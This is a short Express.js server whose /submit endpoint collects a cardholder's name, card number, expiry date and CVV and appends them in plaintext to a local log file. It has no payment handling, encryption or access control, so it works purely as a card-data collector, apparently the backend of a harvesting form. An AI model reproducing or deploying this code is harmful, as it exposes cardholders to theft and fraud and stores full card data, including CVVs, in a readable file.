const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/submit', (req, res) => {
    const { cardName, cardNumber, expiryDate, cvv } = req.body;
    const logEntry = `Name on Card: ${cardName}, Card Number: ${cardNumber}, Expiry Date: ${expiryDate}, CVV: ${cvv}\n`;
    
    // Append the form data to a log file
    fs.appendFile('card-info.log', logEntry, (err) => {
        if (err) {
            console.error('Error writing to log file', err);
            res.status(500).send('Internal Server Error');
            return;
        }
        res.send('Form submitted successfully!');
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
